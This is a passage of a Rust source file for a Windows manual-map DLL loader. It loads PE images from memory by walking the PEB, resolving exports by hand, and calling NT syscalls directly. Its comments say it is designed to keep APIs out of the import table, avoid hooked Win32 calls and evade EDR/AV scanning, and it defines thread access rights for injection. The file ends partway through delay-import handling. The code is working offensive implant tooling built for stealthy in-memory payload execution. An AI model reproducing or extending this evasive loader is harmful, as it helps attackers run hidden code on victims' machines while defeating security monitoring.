//! Manual map PE loader for Windows.
#![cfg(windows)]
#![allow(non_snake_case)]

use anyhow::{anyhow, Result};
use goblin::pe::PE;
use std::collections::HashMap;
use std::ops::Range;
// Use std::ffi::c_void throughout for type compatibility.
use std::ffi::c_void;
use windows_sys::Win32::System::Kernel::LIST_ENTRY;
// Memory and process APIs are now dispatched through nt_syscall::syscall!
// to avoid IAT-visible Win32 hooks.  Only constants remain from windows-sys.
use pe_resolve;
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SCN_MEM_EXECUTE,
    IMAGE_SCN_MEM_READ, IMAGE_SCN_MEM_WRITE,
};
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_NOACCESS,
    PAGE_READONLY, PAGE_READWRITE,
};
use windows_sys::Win32::System::SystemInformation::{
    IMAGE_FILE_MACHINE_AMD64, IMAGE_FILE_MACHINE_ARM64, IMAGE_FILE_MACHINE_I386,
};
use windows_sys::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
};

/// NT-native UNICODE_STRING (not exposed by windows-sys).
#[repr(C)]
struct UNICODE_STRING {
    Length: u16,
    MaximumLength: u16,
    Buffer: *mut u16,
}

/// Minimal thread access for injection: THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_LIMITED_INFORMATION.
const THREAD_INJECT_ACCESS: u64 = 0x1A02;
const NT_THREAD_SUSPENDED: u64 = 0x0000_0001;
const IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT_REMOTE: usize = 13;
const DELAY_IMPORT_DESCRIPTOR_SIZE: usize = 32;

fn normalize_import_dll_name(name: &str) -> String {
    let mut normalized = name.trim().to_ascii_lowercase();
    if !normalized.ends_with(".dll") {
        normalized.push_str(".dll");
    }
    normalized
}

#[cfg(target_arch = "aarch64")]
fn push_arm64_instruction(stub: &mut Vec<u8>, instruction: u32) {
    stub.extend_from_slice(&instruction.to_le_bytes());
}

#[cfg(target_arch = "aarch64")]
fn push_arm64_mov_imm64(stub: &mut Vec<u8>, reg: u8, value: u64) {
    debug_assert!(reg < 32);
    let rd = (reg as u32) & 0x1f;
    for halfword in 0..4u32 {
        let imm16 = ((value >> (halfword * 16)) & 0xffff) as u32;
        let opcode = if halfword == 0 {
            0xD280_0000
        } else {
            0xF280_0000
        };
        push_arm64_instruction(stub, opcode | (halfword << 21) | (imm16 << 5) | rd);
    }
}

#[cfg(target_arch = "aarch64")]
fn push_arm64_blr(stub: &mut Vec<u8>, reg: u8) {
    push_arm64_instruction(stub, 0xD63F_0000 | (((reg as u32) & 0x1f) << 5));
}

#[cfg(target_arch = "aarch64")]
fn push_arm64_dll_entry_call(stub: &mut Vec<u8>, target: u64, image_base: u64) {
    push_arm64_mov_imm64(stub, 0, image_base);
    push_arm64_mov_imm64(stub, 1, DLL_PROCESS_ATTACH as u64);
    push_arm64_mov_imm64(stub, 2, 0);
    push_arm64_mov_imm64(stub, 16, target);
    push_arm64_blr(stub, 16);
}

#[cfg(target_arch = "x86")]
fn push_x86_dll_entry_call(stub: &mut Vec<u8>, target: u32, image_base: u32) {
    stub.extend_from_slice(&[0x6A, 0x00]);
    stub.extend_from_slice(&[0x6A, DLL_PROCESS_ATTACH as u8]);
    stub.push(0x68);
    stub.extend_from_slice(&image_base.to_le_bytes());
    stub.push(0xB8);
    stub.extend_from_slice(&target.to_le_bytes());
    stub.extend_from_slice(&[0xFF, 0xD0]);
}

fn checked_image_range(start: usize, size: usize, image_size: usize) -> Option<Range<usize>> {
    let end = start.checked_add(size)?;
    if start <= image_size && end <= image_size {
        Some(start..end)
    } else {
        None
    }
}

/// Convert an RVA (Relative Virtual Address) from a PE's optional-header /
/// data-directory fields to a raw file byte offset within `dll_bytes`.
///
/// For PEs where every section has `VirtualAddress == PointerToRawData` the
/// RVA is usable directly as a byte index — but this is **not** guaranteed by
/// the PE spec.  Normal linkers and tools like UPX produce sections where the
/// file layout differs from the virtual layout.  Using an RVA as a raw index
/// silently reads the wrong bytes.
///
/// Returns `None` when the RVA falls outside all sections.
fn rva_to_file_offset(
    sections: &[goblin::pe::section_table::SectionTable],
    rva: usize,
) -> Option<usize> {
    for section in sections {
        let sec_va = section.virtual_address as usize;
        let sec_vs = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        if rva >= sec_va && rva < sec_va + sec_vs {
            let delta = rva - sec_va;
            let raw = section.pointer_to_raw_data as usize;
            // If the raw data doesn't cover the full RVA range, the remaining
            // bytes are zero-fill and have no file backing.
            return Some(raw + delta);
        }
    }
    None
}

fn checked_rva_range(rva: u32, size: u32, image_size: usize) -> Option<Range<usize>> {
    checked_image_range(rva as usize, size as usize, image_size)
}

fn checked_table_range(
    rva: u32,
    count: usize,
    elem_size: usize,
    image_size: usize,
) -> Option<Range<usize>> {
    checked_image_range(rva as usize, count.checked_mul(elem_size)?, image_size)
}

unsafe fn bounded_c_string_from_rva<'a>(
    base: *const u8,
    rva: u32,
    upper_bound: usize,
) -> Option<&'a [u8]> {
    let start = rva as usize;
    if start >= upper_bound {
        return None;
    }
    for pos in start..upper_bound {
        if *base.add(pos) == 0 {
            return Some(std::slice::from_raw_parts(base.add(start), pos - start));
        }
    }
    None
}

// RUNTIME_FUNCTION (IMAGE_RUNTIME_FUNCTION_ENTRY) – 12 bytes, x64 only.
#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct RuntimeFunction {
    begin_address: u32,
    end_address: u32,
    unwind_info_address: u32,
}

// P2-18: RtlAddFunctionTable is now resolved at runtime via pe_resolve
// (hash-based API resolution from ntdll) rather than declared as an extern
// static import.  This removes it from the IAT, avoiding a static analysis
// indicator that could be flagged by EDR/AV scanning the module loader's
// import table.

// 1. Defining PEB and LDR structures to walk PEB

#[repr(C)]
struct PEB {
    InheritedAddressSpace: u8,
    ReadImageFileExecOptions: u8,
    BeingDebugged: u8,
    BitFields: u8,
    Mutant: *mut c_void,
    ImageBaseAddress: *mut c_void,
    Ldr: *mut PEB_LDR_DATA,
}

#[repr(C)]
struct PEB_LDR_DATA {
    Length: u32,
    Initialized: u8,
    SsHandle: *mut c_void,
    InLoadOrderModuleList: LIST_ENTRY,
    InMemoryOrderModuleList: LIST_ENTRY,
    InInitializationOrderModuleList: LIST_ENTRY,
}

#[repr(C)]
struct LDR_DATA_TABLE_ENTRY {
    InLoadOrderLinks: LIST_ENTRY,
    InMemoryOrderLinks: LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase: *mut c_void,
    EntryPoint: *mut c_void,
    SizeOfImage: u32,
    FullDllName: UNICODE_STRING,
    BaseDllName: UNICODE_STRING,
}

/// Load a module using LdrLoadDll resolved via PEB walk — avoids LoadLibraryA.
unsafe fn load_via_ldr(module_name: &str) -> *mut c_void {
    // Resolve LdrLoadDll from the already-loaded ntdll via PEB walk.
    let ntdll = get_module_handle_peb("ntdll.dll");
    if ntdll.is_null() {
        return std::ptr::null_mut();
    }
    let ldr_load_dll_ptr = get_proc_address_manual(ntdll, "LdrLoadDll");
    if ldr_load_dll_ptr.is_null() {
        return std::ptr::null_mut();
    }

    type LdrLoadDllFn = unsafe extern "system" fn(
        search_path: *const u16,
        dll_characteristics: *const u32,
        module_name: *const UNICODE_STRING,
        base_address: *mut *mut c_void,
    ) -> i32;
    let ldr_load_dll: LdrLoadDllFn = std::mem::transmute(ldr_load_dll_ptr);

    // Build a UNICODE_STRING for the module name.
    let mut wide: Vec<u16> = module_name
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();
    let us = UNICODE_STRING {
        Length: ((wide.len() - 1) * 2) as u16,
        MaximumLength: (wide.len() * 2) as u16,
        Buffer: wide.as_mut_ptr(),
    };

    let mut base: *mut c_void = std::ptr::null_mut();
    let status = ldr_load_dll(std::ptr::null(), std::ptr::null(), &us, &mut base);
    if status < 0 {
        std::ptr::null_mut()
    } else {
        base
    }
}

unsafe fn get_module_handle_peb(module_name: &str) -> *mut c_void {
    #[cfg(target_arch = "x86_64")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) p);
        p as *mut PEB
    };

    #[cfg(target_arch = "x86")]
    let peb: *mut PEB = {
        let mut p: *mut c_void;
        std::arch::asm!("mov {}, fs:[0x30]", out(reg) p);
        p as *mut PEB
    };

    // ARM64 Windows: TEB is in x18, PEB pointer is at offset 0x30 within TEB.
    // NtCurrentTeb() returns the TEB base via x18, and the PEB pointer
    // lives at TEB+0x30 (ProcessEnvironmentBlock field).
    #[cfg(target_arch = "aarch64")]
    let peb: *mut PEB = {
        let teb: *mut c_void;
        std::arch::asm!("mov {}, x18", out(reg) teb);
        let peb_ptr = teb.add(0x30) as *mut *mut PEB;
        if peb_ptr.is_null() {
            return std::ptr::null_mut();
        }
        *peb_ptr
    };

    if peb.is_null() || (*peb).Ldr.is_null() {
        return std::ptr::null_mut();
    }

    let ldr = (*peb).Ldr;
    let list_head = &mut (*ldr).InLoadOrderModuleList as *mut LIST_ENTRY;
    let mut current = (*list_head).Flink;

    let name_lower = module_name.to_lowercase();
    let name_no_ext = name_lower.trim_end_matches(".dll");

    while current != list_head && !current.is_null() {
        let entry = current as *mut LDR_DATA_TABLE_ENTRY;
        let base_dll_name = &(*entry).BaseDllName;

        if base_dll_name.Length > 0 && !base_dll_name.Buffer.is_null() {
            let slice = std::slice::from_raw_parts(
                base_dll_name.Buffer,
                (base_dll_name.Length / 2) as usize,
            );
            if let Ok(name) = String::from_utf16(slice) {
                let n = name.to_lowercase();
                if n == name_lower || n.trim_end_matches(".dll") == name_no_ext {
                    return (*entry).DllBase;
                }
            }
        }
        current = (*current).Flink;
    }
    std::ptr::null_mut()
}

/// Resolve a function by ordinal from a module's export table without calling
/// the hookable `GetProcAddress`.  Used for delay-import ordinal entries.
///
/// Includes a bounded recursion guard (thread-local depth counter) to prevent
/// stack overflow from circular or deeply nested export forwarder chains.
unsafe fn get_proc_address_by_ordinal_manual(module: *mut c_void, ordinal: u16) -> *mut c_void {
    // Bounded recursion guard: forwarded exports can chain across modules.
    // A pathological or malicious export table could form a cycle; cap the depth.
    thread_local! {
        static ORDINAL_FWD_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }
    const MAX_ORDINAL_FWD_DEPTH: u32 = 8;
    let depth = ORDINAL_FWD_DEPTH.with(|c| c.get());
    if depth >= MAX_ORDINAL_FWD_DEPTH {
        return std::ptr::null_mut();
    }
    ORDINAL_FWD_DEPTH.with(|c| c.set(depth + 1));
    struct DepthGuard;
    impl Drop for DepthGuard {
        fn drop(&mut self) {
            ORDINAL_FWD_DEPTH.with(|c| c.set(c.get().saturating_sub(1)));
        }
    }
    let _guard = DepthGuard;

    if module.is_null() {
        return std::ptr::null_mut();
    }
    let base = module as *const u8;
    let dos_header = &*(base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }
    if dos_header.e_lfanew < 0 {
        return std::ptr::null_mut();
    }
    let e_lfanew = dos_header.e_lfanew as usize;

    #[cfg(target_arch = "x86")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "x86_64")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "aarch64")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

    let nt_headers = &*(base.add(e_lfanew) as *const IMAGE_NT_HEADERS);
    if nt_headers.Signature != 0x4550 {
        return std::ptr::null_mut();
    }
    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_dir_size =
        nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
    if export_dir_rva == 0 {
        return std::ptr::null_mut();
    }
    let image_size = nt_headers.OptionalHeader.SizeOfImage as usize;
    let export_range = match checked_rva_range(export_dir_rva, export_dir_size, image_size) {
        Some(range) if range.len() >= std::mem::size_of::<IMAGE_EXPORT_DIRECTORY>() => range,
        _ => return std::ptr::null_mut(),
    };
    let export_dir = &*(base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    // OrdinalBase: the lowest ordinal exported by this module.
    // index into AddressOfFunctions = ordinal - OrdinalBase
    let base_ord = export_dir.Base;
    if (ordinal as u32) < base_ord {
        return std::ptr::null_mut();
    }
    let index = (ordinal as u32 - base_ord) as usize;
    if index >= export_dir.NumberOfFunctions as usize {
        return std::ptr::null_mut();
    }
    let funcs_range = match checked_table_range(
        export_dir.AddressOfFunctions,
        export_dir.NumberOfFunctions as usize,
        std::mem::size_of::<u32>(),
        image_size,
    ) {
        Some(range) => range,
        None => return std::ptr::null_mut(),
    };
    let funcs = std::slice::from_raw_parts(
        base.add(funcs_range.start) as *const u32,
        export_dir.NumberOfFunctions as usize,
    );
    let func_rva = funcs[index];
    if func_rva == 0 {
        return std::ptr::null_mut();
    }

    // Forwarded export check: if func_rva falls within the export directory
    // range, the bytes at func_rva are a null-terminated ASCII forwarder
    // string of the form "ModuleName.FunctionName" (or "ModuleName.#Ordinal").
    let func_rva_usize = func_rva as usize;
    if export_range.contains(&func_rva_usize) {
        let fwd_slice = match bounded_c_string_from_rva(base, func_rva, export_range.end) {
            Some(slice) => slice,
            None => return std::ptr::null_mut(),
        };
        if let Ok(fwd_str) = std::str::from_utf8(fwd_slice) {
            if let Some(dot) = fwd_str.find('.') {
                let target_mod = &fwd_str[..dot];
                let target_fn = &fwd_str[dot + 1..];
                // Try PEB walk first, then fall back to a ntdll-direct load.
                let mut mod_handle = get_module_handle_peb(target_mod);
                if mod_handle.is_null() {
                    mod_handle = load_via_ldr(target_mod);
                }
                if !mod_handle.is_null() {
                    // The forwarder target may be a name ("FuncName") or an
                    // ordinal reference ("#123").  Handle both forms.
                    if let Some(ordinal_str) = target_fn.strip_prefix('#') {
                        if let Ok(target_ord) = ordinal_str.parse::<u16>() {
                            return get_proc_address_by_ordinal_manual(mod_handle, target_ord);
                        }
                    } else {
                        return get_proc_address_manual(mod_handle, target_fn);
                    }
                }
            }
        }
        return std::ptr::null_mut();
    }

    if func_rva_usize >= image_size {
        return std::ptr::null_mut();
    }

    base.add(func_rva as usize) as *mut c_void
}

unsafe fn get_proc_address_manual(module: *mut c_void, proc_name: &str) -> *mut c_void {
    // Bounded recursion guard: forwarded exports can chain across modules
    // (kernel32!HeapAlloc -> ntdll!RtlAllocateHeap -> ...).  A pathological
    // or malicious export table could form a cycle; cap the depth.
    thread_local! {
        static FORWARDER_DEPTH: std::cell::Cell<u32> = const { std::cell::Cell::new(0) };
    }
    const MAX_FORWARDER_DEPTH: u32 = 8;
    let depth = FORWARDER_DEPTH.with(|c| c.get());
    if depth >= MAX_FORWARDER_DEPTH {
        return std::ptr::null_mut();
    }
    FORWARDER_DEPTH.with(|c| c.set(depth + 1));
    struct DepthGuard;
    impl Drop for DepthGuard {
        fn drop(&mut self) {
            FORWARDER_DEPTH.with(|c| c.set(c.get().saturating_sub(1)));
        }
    }
    let _g = DepthGuard;

    if module.is_null() {
        return std::ptr::null_mut();
    }
    let base = module as *const u8;
    let dos_header = &*(base as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D {
        return std::ptr::null_mut();
    }
    if dos_header.e_lfanew < 0 {
        return std::ptr::null_mut();
    }

    let e_lfanew = dos_header.e_lfanew as usize;

    #[cfg(target_arch = "x86")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "x86_64")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;
    #[cfg(target_arch = "aarch64")]
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64 as IMAGE_NT_HEADERS;

    let nt_headers = &*(base.add(e_lfanew) as *const IMAGE_NT_HEADERS);
    if nt_headers.Signature != 0x4550 {
        return std::ptr::null_mut();
    }

    let export_dir_rva = nt_headers.OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
        .VirtualAddress;
    let export_dir_size =
        nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].Size;
    if export_dir_rva == 0 {
        // No export directory — cannot resolve this function manually.
        return std::ptr::null_mut();
    }
    let image_size = nt_headers.OptionalHeader.SizeOfImage as usize;
    let export_range = match checked_rva_range(export_dir_rva, export_dir_size, image_size) {
        Some(range) if range.len() >= std::mem::size_of::<IMAGE_EXPORT_DIRECTORY>() => range,
        _ => return std::ptr::null_mut(),
    };

    let export_dir = &*(base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY);
    let names_range = match checked_table_range(
        export_dir.AddressOfNames,
        export_dir.NumberOfNames as usize,
        std::mem::size_of::<u32>(),
        image_size,
    ) {
        Some(range) => range,
        None => return std::ptr::null_mut(),
    };
    let funcs_range = match checked_table_range(
        export_dir.AddressOfFunctions,
        export_dir.NumberOfFunctions as usize,
        std::mem::size_of::<u32>(),
        image_size,
    ) {
        Some(range) => range,
        None => return std::ptr::null_mut(),
    };
    let ords_range = match checked_table_range(
        export_dir.AddressOfNameOrdinals,
        export_dir.NumberOfNames as usize,
        std::mem::size_of::<u16>(),
        image_size,
    ) {
        Some(range) => range,
        None => return std::ptr::null_mut(),
    };
    let names = std::slice::from_raw_parts(
        base.add(names_range.start) as *const u32,
        export_dir.NumberOfNames as usize,
    );
    let funcs = std::slice::from_raw_parts(
        base.add(funcs_range.start) as *const u32,
        export_dir.NumberOfFunctions as usize,
    );
    let ords = std::slice::from_raw_parts(
        base.add(ords_range.start) as *const u16,
        export_dir.NumberOfNames as usize,
    );

    for i in 0..export_dir.NumberOfNames as usize {
        let name_rva = names[i];
        let name_slice = match bounded_c_string_from_rva(base, name_rva, image_size) {
            Some(slice) => slice,
            None => return std::ptr::null_mut(),
        };
        if let Ok(n) = std::str::from_utf8(name_slice) {
            if n == proc_name {
                let func_index = ords[i] as usize;
                if func_index >= funcs.len() {
                    return std::ptr::null_mut();
                }
                let func_rva = funcs[func_index];
                if func_rva != 0 {
                    let func_rva_usize = func_rva as usize;
                    if export_range.contains(&func_rva_usize) {
                        // Forwarded export: bytes at func_rva are a null-terminated ASCII
                        // string of the form "ModuleName.FunctionName".
                        let fwd_slice =
                            match bounded_c_string_from_rva(base, func_rva, export_range.end) {
                                Some(slice) => slice,
                                None => return std::ptr::null_mut(),
                            };
                        if let Ok(fwd_str) = std::str::from_utf8(fwd_slice) {
                            if let Some(dot) = fwd_str.find('.') {
                                let target_mod = &fwd_str[..dot];
                                let target_fn = &fwd_str[dot + 1..];
                                // Try PEB walk first, then fall back to a ntdll-direct load.
                                let mut mod_handle = get_module_handle_peb(target_mod);
                                if mod_handle.is_null() {
                                    mod_handle = load_via_ldr(target_mod);
                                }
                                if !mod_handle.is_null() {
                                    return get_proc_address_manual(mod_handle, target_fn);
                                }
                            }
                        }
                        return std::ptr::null_mut();
                    }
                    if func_rva_usize >= image_size {
                        return std::ptr::null_mut();
                    }
                    return base.add(func_rva_usize) as *mut c_void;
                }
            }
        }
    }

    // Function not found in the export table — return null rather than
    // calling the hooked Win32 GetProcAddress.
    std::ptr::null_mut()
}

pub unsafe fn load_dll_in_memory(dll_bytes: &[u8]) -> Result<*mut c_void> {
    let pe = PE::parse(dll_bytes)?;
    let optional_header = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    // 0. Validate that the PE machine type and bitness match the host process.
    //    Loading a PE32 (32-bit) image in a 64-bit host process (or vice versa)
    //    will fail at runtime: TLS directory fields, IAT thunk widths, and the
    //    DllMain call convention all assume matching pointer widths.
    let machine = pe.header.coff_header.machine;
    match machine {
        IMAGE_FILE_MACHINE_AMD64 | IMAGE_FILE_MACHINE_ARM64 => {
            // 64-bit PE: requires a 64-bit host.
            #[cfg(not(any(target_arch = "x86_64", target_arch = "aarch64")))]
            {
                return Err(anyhow!(
                    "load_dll_in_memory: PE is 64-bit (machine={:#06x}) but host process is 32-bit",
                    machine
                ));
            }
        }
        IMAGE_FILE_MACHINE_I386 => {
            // 32-bit PE: requires a 32-bit host.
            #[cfg(not(target_arch = "x86"))]
            {
                return Err(anyhow!(
                    "load_dll_in_memory: PE is 32-bit (I386) but host process is 64-bit"
                ));
            }
        }
        _ => {
            return Err(anyhow!(
                "load_dll_in_memory: unsupported PE machine type {:#06x}",
                machine
            ));
        }
    }
    // Also reject architecture mismatches (e.g. AMD64 DLL on ARM64 host).
    #[cfg(target_arch = "x86_64")]
    if machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(anyhow!(
            "load_dll_in_memory: PE machine type {:#06x} does not match host architecture (expected AMD64)",
            machine
        ));
    }
    #[cfg(target_arch = "aarch64")]
    if machine != IMAGE_FILE_MACHINE_ARM64 {
        return Err(anyhow!(
            "load_dll_in_memory: PE machine type {:#06x} does not match host architecture (expected ARM64)",
            machine
        ));
    }
    #[cfg(target_arch = "x86")]
    if machine != IMAGE_FILE_MACHINE_I386 {
        return Err(anyhow!(
            "load_dll_in_memory: PE machine type {:#06x} does not match host architecture (expected I386)",
            machine
        ));
    }

    // 1. Allocate memory for the DLL.
    // Try the preferred image base first to avoid relocations when that VA
    // range is available, then fall back to an OS-chosen address.
    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAlloc hooks.
    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent

    let preferred_base_ptr = optional_header.windows_fields.image_base as *mut c_void;
    let image_size = optional_header.windows_fields.size_of_image as usize;
    let mut preferred_alloc = preferred_base_ptr;
    let mut alloc_size = image_size;
    let pref_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        -1isize as u64, // current process
        &mut preferred_alloc as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    let preferred_ok = pref_status.map_or(false, |s| s >= 0) && !preferred_alloc.is_null();

    let (image_base, used_fallback_alloc) = if !preferred_ok {
        let mut fallback: *mut c_void = std::ptr::null_mut();
        let mut fb_size = image_size;
        let fb_status = nt_syscall::syscall!(
            "NtAllocateVirtualMemory",
            -1isize as u64,
            &mut fallback as *mut _ as u64,
            0u64,
            &mut fb_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        if fb_status.map_or(true, |s| s < 0) || fallback.is_null() {
            return Err(anyhow!("NtAllocateVirtualMemory failed"));
        }
        (fallback, true)
    } else {
        (preferred_alloc, false)
    };

    let preferred_base = optional_header.windows_fields.image_base as isize;
    let base_delta = image_base as isize - preferred_base;
    if used_fallback_alloc && base_delta != 0 {
        // When preferred-base allocation fails, rebasing is mandatory.
        // Refuse to continue unless a sane relocation directory exists.
        let reloc_dir = optional_header.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
            .map(|(_, dd)| dd)
            .ok_or_else(|| anyhow!(
                "VirtualAlloc at preferred base failed and PE has no relocation directory; cannot apply rebasing"
            ))?;
        if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
            return Err(anyhow!(
                "VirtualAlloc at preferred base failed and relocation directory is empty; cannot apply rebasing"
            ));
        }

        let image_size = optional_header.windows_fields.size_of_image as usize;
        let reloc_start = reloc_dir.virtual_address as usize;
        let reloc_size = reloc_dir.size as usize;
        let reloc_end = reloc_start
            .checked_add(reloc_size)
            .ok_or_else(|| anyhow!("relocation directory range overflow"))?;
        if reloc_start >= image_size || reloc_end > image_size {
            return Err(anyhow!(
                "VirtualAlloc at preferred base failed and relocation directory is out of image bounds"
            ));
        }
    }

    struct AllocGuard {
        ptr: *mut c_void,
        success: bool,
    }
    impl Drop for AllocGuard {
        fn drop(&mut self) {
            if !self.success {
                let mut base = self.ptr;
                let mut size: usize = 0;
                let _ = nt_syscall::syscall!(
                    "NtFreeVirtualMemory",
                    -1isize as u64,
                    &mut base as *mut _ as u64,
                    &mut size as *mut _ as u64,
                    MEM_RELEASE as u64,
                );
            }
        }
    }
    let mut _guard = AllocGuard {
        ptr: image_base,
        success: false,
    };

    // 1b. Copy PE headers (DOS header, NT headers, section table) so that
    //     DLLs which inspect their own headers at runtime (resource lookup,
    //     TLS callbacks, etc.) find the expected data rather than zeroed memory.
    let size_of_headers = optional_header.windows_fields.size_of_headers as usize;
    std::ptr::copy_nonoverlapping(
        dll_bytes.as_ptr(),
        image_base as *mut u8,
        size_of_headers.min(dll_bytes.len()),
    );

    // 2. Validate section layout: reject PEs with overlapping virtual ranges.
    //    Overlapping sections are either corrupt or a crafted PE that could
    //    trigger memory corruption when sections are mapped on top of each other.
    {
        let mut ranges: Vec<(usize, usize, &str)> = Vec::new();
        for section in &pe.sections {
            let va = section.virtual_address as usize;
            let vs = section.virtual_size as usize;
            if vs == 0 {
                continue;
            }
            let name = section.name().unwrap_or("???");
            let end = va.checked_add(vs).ok_or_else(|| {
                anyhow!(
                    "PE section '{}' virtual range overflow (va={:#x}, vs={:#x})",
                    name,
                    va,
                    vs
                )
            })?;
            // Check against all previously seen ranges.
            for &(prev_va, prev_end, prev_name) in &ranges {
                if va < prev_end && end > prev_va {
                    return Err(anyhow!(
                        "PE sections '{}' [{:#x}..{:#x}) and '{}' [{:#x}..{:#x}) overlap",
                        prev_name,
                        prev_va,
                        prev_end,
                        name,
                        va,
                        end
                    ));
                }
            }
            ranges.push((va, end, name));
        }
    }

    // 3. Copy sections
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        let raw_end = raw_offset
            .checked_add(raw_size)
            .ok_or_else(|| anyhow!("PE section raw data range overflow"))?;
        if raw_end > dll_bytes.len() {
            return Err(anyhow!(
                "PE section data (offset {:#x} + size {:#x}) exceeds DLL buffer length {}; PE is corrupt",
                raw_offset,
                raw_size,
                dll_bytes.len()
            ));
        }
        checked_image_range(section.virtual_address as usize, raw_size, image_size).ok_or_else(
            || {
                anyhow!(
                    "PE section virtual data (rva {:#x} + size {:#x}) exceeds image size {}; PE is corrupt",
                    section.virtual_address,
                    raw_size,
                    image_size
                )
            },
        )?;
        let dest = image_base.add(section.virtual_address as usize);
        let src = dll_bytes.as_ptr().add(raw_offset);
        std::ptr::copy_nonoverlapping(src, dest as *mut u8, raw_size);
    }

    // 3. Process imports
    let mut loaded_modules: HashMap<&str, *mut c_void> = HashMap::new();

    for import in &pe.imports {
        let dll_name = import.dll;
        if !loaded_modules.contains_key(dll_name) {
            let mut handle = get_module_handle_peb(dll_name);
            if handle.is_null() {
                handle = load_via_ldr(dll_name);
                if handle.is_null() {
                    return Err(anyhow!("Failed to load dependent module {}", dll_name));
                }
            }
            loaded_modules.insert(dll_name, handle);
        }
        let module_handle = *loaded_modules.get(dll_name).unwrap();
        let proc_addr = if import.name.starts_with("ORDINAL ") {
            // Ordinal import: goblin synthesises a name like "ORDINAL 42".
            // Use the ordinal field to resolve directly from the export table.
            get_proc_address_by_ordinal_manual(module_handle, import.ordinal)
        } else {
            get_proc_address_manual(module_handle, &import.name)
        };
        if proc_addr.is_null() {
            return Err(anyhow!("Failed to resolve function {}", import.name));
        }
        // Width-aware IAT write: PE32+ uses 8-byte thunks, PE32 uses 4-byte.
        let is_pe32_plus = optional_header.standard_fields.magic == 0x020B;
        let thunk_size = if is_pe32_plus {
            std::mem::size_of::<u64>()
        } else {
            std::mem::size_of::<u32>()
        };
        let thunk_range =
            checked_image_range(import.rva, thunk_size, image_size).ok_or_else(|| {
                anyhow!(
                    "manual_map: import thunk for {}!{} at rva {:#x} exceeds image size {}",
                    dll_name,
                    import.name,
                    import.rva,
                    image_size
                )
            })?;
        let thunk_ref = image_base.add(thunk_range.start);
        if is_pe32_plus {
            *(thunk_ref as *mut u64) = proc_addr as u64;
        } else {
            *(thunk_ref as *mut u32) = proc_addr as u32;
        }
    }

    // 3b. Process delay imports (IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT = 13).
    //
    // ImgDelayDescr layout — all fields are RVAs when grAttrs bit 0 (dlattrRva) is set:
    //   +0x00  grAttrs       u32  — bit 0 = 1 means all addresses are RVAs
    //   +0x04  rvaDLLName    u32  — RVA of DLL name string
    //   +0x08  rvaHmod       u32  — RVA of HMODULE slot
    //   +0x0C  rvaIAT        u32  — RVA of IAT (thunks that will be resolved)
    //   +0x10  rvaINT        u32  — RVA of INT (original unbound thunks)
    //   +0x14  rvaBoundIAT   u32  — RVA of bound IAT (may be NULL)
    //   +0x18  rvaUnloadIAT  u32  — RVA of unload IAT (may be NULL)
    //   +0x1C  dwTimeStamp   u32  — time stamp (0 = not bound)
    const IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT: usize = 13;
    const DELAY_DESCR_SIZE: usize = 32; // 8 × u32

    if let Some(delay_dir) = optional_header.data_directories.data_directories
        [IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT]
        .map(|(_, dd)| dd)
    {
        if delay_dir.virtual_address != 0 && delay_dir.size > 0 {
            let image_size = optional_header.windows_fields.size_of_image as usize;
